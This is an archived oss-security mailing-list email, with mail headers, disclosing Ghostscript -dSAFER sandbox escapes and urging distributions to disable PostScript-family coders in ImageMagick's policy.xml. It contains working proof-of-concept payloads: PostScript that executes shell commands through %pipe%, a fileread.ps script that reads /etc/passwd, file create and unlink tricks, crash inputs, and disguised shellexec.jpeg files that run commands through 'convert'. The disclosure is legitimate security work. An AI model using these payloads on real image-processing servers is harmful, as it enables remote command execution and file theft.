X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6114" "Tuesday" "21" "August" "2018" "05:46:26" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>" "178" "[oss-security] More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "8" "2018082112:46:26" "[oss-security] More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        taviso@googl Aug 21  178/6114  " thread-indent "\"[oss-security] More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 28495 invoked by uid 550); 21 Aug 2018 12:46:50 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 28461 invoked from network); 21 Aug 2018 12:46:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=ZT2gIwyhe9tnN6XTu9TENoo7PA/5I5+YCSW0ju7vi34=;
        b=j3qtE+b+UUgg3vFmJjQnODHRs7pwhx2ljom7fYD49G2k2P4UgBBdRcurrxiTB+tT15
         PTQEzjR53Pgx/a+jGKJIJ9YH2vR5OC1t6apOzt6lzGOOep8ZRFMwrRQXG9oGma9Jwo+4
         YrYrAuYD1fiicFAuIQaPtNR7OFndPbDuZYrqdr4th5xWQQhq2IO/pX1joFlrrgqibBTH
         5DogioGZs9hiTP5MNVWGhx2U0tImDHyy12zHITqwZPE+CnEs+lLjXGIcrHtNPqY27BwT
         qQMge0hXcy0R1UXQuB0aDHhdNbqERVEsZgqN0ddZ8XKWvAT/8Y2yYAJYkHq6nMIgEypf
         jfww==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=ZT2gIwyhe9tnN6XTu9TENoo7PA/5I5+YCSW0ju7vi34=;
        b=q8HiN71Idl8TAYelmltab7wQ5LSBS2NHsscaxYzWLqOWO80SnIhyaBIuay7GvY6WMn
         DNDpRpieNZYMs4dVi+IbcPeHzHPOIFWRBQlHBs2TnRewT7VQKVDPffJ08q1eFhbd8QtX
         2n7YRuq44P2nmiGc7XMP4IVNv6tZbUPwMq9Z+fv3C9B1NViEJq8tqVq/OvBZwNZOOGzR
         gOqoIolJEHvvHJs03ApQiz1Uej4u6CAzBIZfFdfkucDcxXWKxUau+HKqLj0yVowYxQoc
         +OQvO+ZOiJ07Ee9Rx/iXgIPjhmo4KVI4Fc+d0vkfk/0kqQKlN1L7Uuqnq4TvuNpXqynA
         8clQ==
X-Gm-Message-State: AOUpUlGCpya39U1CbKyvBDAM/FTAPxJtqHwHvguM6C5OjZ6ige4GuLob
	2sfxDklw1O9AkhQ9VjE6+SIai7PESky2UiiWeqOT9501LTg=
X-Google-Smtp-Source: AA+uWPwNHEbOrlQZNk+f2p+rKfFGwH9k/Wa3SK7hnxKoKd/s2czR5ydXTTnO9PQJ55UikHt5Ga8dd3/tOmNth5Yrsko=
X-Received: by 2002:ac8:c86:: with SMTP id n6-v6mr47590946qti.324.1534855597312;
 Tue, 21 Aug 2018 05:46:37 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>
Content-Type: multipart/alternative; boundary="000000000000a969ed0573f16a64"
Date: Tue, 21 Aug 2018 05:46:26 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
To: oss-security@lists.openwall.com

--000000000000a969ed0573f16a64
Content-Type: text/plain; charset="UTF-8"

Hello, this was discussed on the distros list, but it was suggested to move
discussion to oss-security.

You might recall I posted a bunch of -dSAFER sandbox escapes in ghostscript
a few years ago:

http://seclists.org/oss-sec/2016/q4/29

I found a few file disclosure, shell command execution, memory corruption
and type confusion bugs. There was also one that was found exploited in the
wild <http://ghostbutt.com/>. There was also a similar widely exploited
issue <https://imagetragick.com/> that could be exploited identically.

TL;DR: I *strongly* suggest that distributions start disabling PS, EPS, PDF
and XPS coders in policy.xml by default.

$ convert input.jpg output.gif
uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

I've found a few more surprising ways to reach ghostscript recently, so
went back to look again and found a few more.

1. /invalidaccess checks stop working after a failed restore, so you can
just execute shell commands if you handle the error. Exploitation is very
trivial. Repro:

$ *gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null*
GS>*legal*
GS>*{ null restore } stopped { pop } if*
GS>*legal*
GS>*mark /OutputFile (%pipe%id) currentdevice putdeviceprops*
GS<1>*showpage*
uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

(ImageMagick PoC at end of mail)

2. setcolor claims
<http://git.ghostscript.com/?p=ghostpdl.git;a=blob;f=psi/zcolor.c;h=4c0f25827e320ceaa9b510c98f9b1926532a26d5;hb=HEAD#l263>
no
operand checking is necessary, because it's hidden behind a pseudo-operator
of the same name. That's true, but you can still call it indirectly via
setpattern, so type checking is necessary. Repro:

$ *gs -q -sDEVICE=ppmraw -dSAFER*
GS>*<< /Whatever 16#414141414141 >> setpattern*
Segmentation fault

3. The LockDistillerParams boolean isn't type checked, so nice easy type
confusion. Repro:

$ *gs -q -sDEVICE=ppmraw -dSAFER*
GS>*<< /LockDistillerParams 16#4141414141414141 >> .setdistillerparams*
Segmentation fault


4. .tempfile permissions don't seem to work, I don't know when they broke.
You're not supposed to be able to open files outside of the patterns in
the  PermitFileReading array, but that doesn't seem to work for me e.g.:
$
*strace -fefile gs -sDEVICE=ppmraw -dSAFER*
...
GS>*(/proc/self/cwd/hello) (w) .tempfile*
open("/proc/self/cwd/hello26E8LQ", O_RDWR|O_CREAT|O_EXCL, 0600) = 3
GS<2>*dup*
GS<3>*(hello) writestring*
GS<2>*closefile*

This means you can create a file in any directory (I don't think you can
prevent the random suffix). Additionally, I have a trick to let you read
and unlink any file you have permission to.

Here is how to unlink() any file:

$
*strace -fefile gs -sDEVICE=ppmraw -dSAFER*
...
GS>*{ .bindnow } stopped {} if*
GS>*(/etc/passwd) [] .tempfile*
GS<2>*.quit*
unlink("/etc/passwd")                   = -1 EACCES (Permission denied)
+++ exited with 0 +++

Reading is more complicated, because the best way I know how to do it is to
interpret a file as as PostScript and catch the syntax errors, here is an
example:

$ *cat fileread.ps <http://fileread.ps>*
/FileToSteal (/etc/passwd) def
errordict /undefinedfilename {
    FileToSteal % save the undefined name
} put
errordict /undefined {
    (STOLEN: ) print
    counttomark {
        ==only
    } repeat
    (\n) print
    FileToSteal
} put
errordict /invalidfileaccess {
    pop
} put
errordict /typecheck {
    pop
} put
FileToSteal (w) .tempfile
statusdict
begin
    1 1 .setpagesize
end
quit
$ *gs -q -sDEVICE=ppmraw -dSAFER  fileread.ps <http://fileread.ps>*
GPL Ghostscript 9.23:
STOLEN: root:x:0:0:root:
STOLEN: daemon:x:1:1:daemon:/bash/bin/root:(/etc/passwd)
STOLEN: bin:x:2:2:bin:/nologin/sbin/usr/sbin:/usr(/etc/passwd)
STOLEN: sys:x:3:3:sys:/nologin/sbin/usr/bin:(/etc/passwd)
STOLEN: sync:x:4:65534:sync:/nologin/sbin/usr/dev:(/etc/passwd)
STOLEN: games:x:5:60:games:/sync/bin/bin:(/etc/passwd)

This can be used to steal arbitrary files from webservers that use
ImageMagick by encoding file contents into the image output, see my
previous PoC here <http://www.openwall.com/lists/oss-security/2016/09/29/3> for
an example. i.e. You can make convert malicious.jpg thumbnail.jpg produce
an image with the contents of a file visible.

These bugs were found manually, I also wrote a fuzzer and I'm working on
minimizing a very large number of testcases that I'm planning to report
over the next few days. I will just file those issues upstream and not post
each individual one here, you can monitor https://bugs.ghostscript.com/ if
you want to.  I expect there to be several dozen unique bugs.

In the meantime, I really *strongly* suggest that distributions start
disabling PS, EPS, PDF and XPS coders in policy.xml by default. I think
this is the number one "unexpected ghostscript" vector, imho this should
happen asap. IMHO, -dSAFER is a fragile security boundary at the moment,
and executing untrusted postscript should be discouraged, at least by
default.

Please note, ImageMagick sends some initialization commands to ghostscript
that breaks my minimal PoC, but you can just undo their changes in
PostScript.

This one works for me on the version in Ubuntu:
$ *cat shellexec.jpeg*
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
$ *convert shellexec.jpeg whatever.gif*
uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

For CentOS, try this:

$ *cat shellexec.jpeg*
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
$ *convert shellexec.jpeg whatever.gif*
uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Thanks, Tavis.

--000000000000a969ed0573f16a64--
